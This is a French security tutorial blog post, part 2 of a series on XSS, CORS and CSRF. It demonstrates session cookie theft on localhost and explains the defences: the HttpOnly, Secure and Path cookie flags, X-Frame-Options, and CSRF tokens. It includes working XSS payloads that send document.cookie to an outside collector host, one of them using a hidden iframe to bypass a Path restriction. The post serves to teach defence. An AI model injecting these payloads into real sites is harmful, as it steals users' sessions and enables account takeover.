---
layout: post
title:  "XSS, CORS, CSRF (Partie 2)"
date:   2016-08-15
categories: web
---
XSS  et vol de cookies par la pratique.
----------

**Vous reprendrez bien un cookie ?**
  
Dans le [premier volet]({{ site.url }}/xss-cors-csrf-partie-1-xss) de notre saga, nous traitions des attaques XSS et des moyens de s’en prémunir. Ces vulnérabilités peuvent être utilisées pour voler vos informations de session ou vous rediriger vers un site frauduleux. Vous vous dîtes sûrement : "ok coco en théorie c’est bien sympa tout ça, mais en quoi consiste le vol d’une session, quelles informations sont envoyées et où part la requête ?".  
  
Imaginons la configuration suivante :
  
![Configuration de l'attaque]({{ site.url }}/public/images/xss-cors-csrf/cors_1.png)
  
Un internaute requête le site *www.site-a.com* qui est un site de confiance mais vulnérable au XSS. Un pirate pourra injecter le code suivant :  

```html
Juste un petit coucou !
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'http://requestb.in/w7iy5sw7?cookie=' + encodeURI(document.cookie));
	xhr.send();
</script>
```
  
Pour notre test nous partirons sur le postulat que *www.site-a.com* est notre *localhost*, et que *www.site-b.com* (le site du pirate qui récupère les infos) correspond au site *http://requestb.in*.  

> Le site **http://requestb.in** est très utile pour analyser les requêtes HTTP.  

Lorsque le script est exécuté, ce dernier accède au **document.cookie** qui correspond au cookie du document HTML courant contenant l’id de session. Ce dernier peut ressembler à ceci :  

![Exemple cookie 1]({{ site.url }}/public/images/xss-cors-csrf/cors_2.png)  
Ou bien ceci :  

![Exemple cookie 2]({{ site.url }}/public/images/xss-cors-csrf/cors_3.png)  
Nous reviendrons sur ce dernier cas par la suite car ce dernier est un cookie sécurisé. Je vous recommande sous Chrome d’installer l’extension [Cookie Inspector]( https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn).  
  
Pour nos tests voici la configuration mise en place :  

 - Une page *http://localhost/secu/cookie.php*:  

```php
<?php
	setcookie('PHPSESSID_secure', 'jm5mah0a9uuf4g344096nled73', 0, '/secu', $_SERVER['SERVER_NAME'], isset($_SERVER["HTTPS"]), true);
	setcookie('PHPSESSID_unsecured', 'jm5mah0a9uuf4g344096nled73', 0, '/', $_SERVER['SERVER_NAME'], false, false);
?>
```  
> Vous ne pouvez pas définir de cookie pour un autre domaine.  

Les cookies générés (deux cookies à des fins de test):  
![Configuration cookies test]({{ site.url }}/public/images/xss-cors-csrf/cors_4.png)  
Les champs [Domain, Path, HTTP et Secure](https://tools.ietf.org/html/rfc6265) sont les champs qui permettront de sécuriser notre cookie:  

**domain** : le domaine racine concerné par le cookie  
**path** : détermine pour quelle arborescence à partir du domaine racine le cookie sera accessible  
**session.cookie_httponly** : empêche un cookie d’être accessible via javascript (XSS ;))  
**session.cookie_secure** : accède au cookie uniquement sur des connexions HTTPS (empêche les informations de transiter en clair – voir également la solution [HSTS](https://developer.mozilla.org/fr/docs/S%C3%A9curit%C3%A9/HTTP_Strict_Transport_Security))    
  
 - Une page vulnérable *http://localhost/xss.php* qui contient le payload vu précédemment.  
  
Ce cookie est envoyé via une requête **XMLHttpRequest** sur *requestb.in*. Regardons quelles informations sont réceptionnées :  
![Requestb.in get data]({{ site.url }}/public/images/xss-cors-csrf/cors_5.png)
  
Nous récupérons bien l’id de session de notre cookie non sécurisé uniquement. Ceci a été possible car :  

  -	Faille **XSS** ayant permis l’injection de javascript
  -	Cookie avec le flag **HttpOnly** à false
  -	Requête **Cross-Origin** simple sur le site du pirate pour récupération des informations
  -	Cookie avec un **Path** permissif (toute l’arborescence du site)  
  
Il convient de définir un path pour lequel le cookie doit être actif, dans notre exemple un espace sécurisé */secu* qui sollicite le cookie session. Ainsi notre page publique vulnérable *xss.php* à la racine */* n’aurait pas été en mesure d’accéder au cookie. Modifions le path de notre cookie unsecured :  
  
```php
setcookie('PHPSESSID_unsecured', 'jm5mah0a9uuf4g344096nled73', 0, '/secu', $_SERVER['SERVER_NAME'], false, false);
```
  
Et si maintenant nous tentions dans notre payload (depuis la page *http://localhost/xss.php*) d’accéder à la page *http://localhost/secu/cookie.php*, de lui voler son cookie et de nous l’envoyer :  
  
```html
<script>    
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function () {

		if (xhr.readyState == 4) {
			var cookie = xhr.getResponseHeader('Set-Cookie');   
				
			var xhr2 = new XMLHttpRequest();
			xhr2.open('GET', 'http://requestb.in/w7iy5sw7?cookie=' + encodeURI(cookie), false);
			xhr2.send();
		}
	}	
	xhr.open('GET', 'http://localhost/secu/cookie.php');
	xhr.send();		  
</script>
```
  
Malheureusement nous obtenons : <span style="color: red">```Refused to get unsafe header "Set-Cookie"```</span>.  
  
La spécification **XMLHttpRequest** interdit l’accès à certains response headers pour des raisons de sécurité. Les navigateurs chrome / firefox / IE retourneront donc null ([https://fetch.spec.whatwg.org/#forbidden-header-name]( https://fetch.spec.whatwg.org/#forbidden-header-name)).  
  
<a name="iframe"></a>N’y-a-t-il pas une autre méthode que notre XHR pour charger cookie.php?  
  
```html
<script>    
	var iframe = document.createElement("iframe");
	iframe.src = "http://localhost/secu/cookie.php";
	iframe.hidden = true;            
	var iframeObj = document.body.appendChild(iframe);

	iframeObj.onload = function(){            
		var cookie = iframeObj.contentDocument.cookie;
		var xhr = new XMLHttpRequest();
		xhr.open('GET', 'http://requestb.in/w7iy5sw7?cookie=' + encodeURI(cookie));
		xhr.send();
	};          	  
</script>
```  
  
Bingo, même avec un path défini pour ce cookie, nous avons pu le récupérer, et si vous avez bien retenu votre leçon dans le [volet 1]({{ site.url }}/xss-cors-csrf-partie-1-xss) de notre saga XSS, vous connaissez la contre-mesure à ce payload : le response header **X-Frame-Options** qui interdit qu’une page soit rendue dans un ```<frame>```, ```<iframe>``` ou ```<object>```. Bien évidemment il est préférable en amont de toujours positionner le flag **HttpOnly**. L’accès au cookie par javascript est peu justifiable dans les développements Web.  
  
> *"J’ai activé la console de mon navigateur et je remarque cependant un warning:"*  

<pre class="alert">
XMLHttpRequest cannot load http://requestb.in/w7iy5sw7?cookie=PHPSESSID_unsecured=jm5mah0a9uuf4g344096nled73.  
No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
</pre>  
  
> *"Nous requêtons depuis une ressource du domaine http://localhost:80 vers le domaine http://requestb.in:80, et nous avons ce message, comment se fait-il que la requête ait abouti ?"*  
  
Et bien je vous remercie d’avoir posé la question :). Nous sommes typiquement dans le cas d’une requête Cross Origin. Aujourd'hui AJAX  est omniprésent dans les développements de par l'essor des frameworks client riches comme AngularJS. Je réserve le détail du **Cross-Origin Resource Sharing** pour le dernier volet de cette saga. La connaissance du CORS est essentielle pour les développeurs WEB.  
  
Imaginez que vous surfiez sur un site frauduleux qui puisse soumettre à votre insu des requêtes sur un de vos sites préférés en incluant vos informations de session et poster des formulaires à votre place... C’est à ce niveau qu’il est essentiel de bien configurer le Cross-Origin Resource Sharing et de définir un **token de sécurité** pour éviter les attaques **Cross-Site Request Forgery**. Ceci nous montre bien que les vecteurs d'attaques sont multiples.  
  
A très bientôt.  
  
**[PART 3](https://phackt.com/xss-cors-csrf-partie-3-cors-csrf)**
<br />
<br />
Références:  
[http://php.net/manual/fr/session.security.php](http://php.net/manual/fr/session.security.php)  
[https://geekflare.com/httponly-secure-cookie-apache/](https://geekflare.com/httponly-secure-cookie-apache/)  
[https://fetch.spec.whatwg.org/](https://fetch.spec.whatwg.org/)  
[https://geekflare.com/secure-cookie-flag-in-tomcat/](https://geekflare.com/secure-cookie-flag-in-tomcat/)
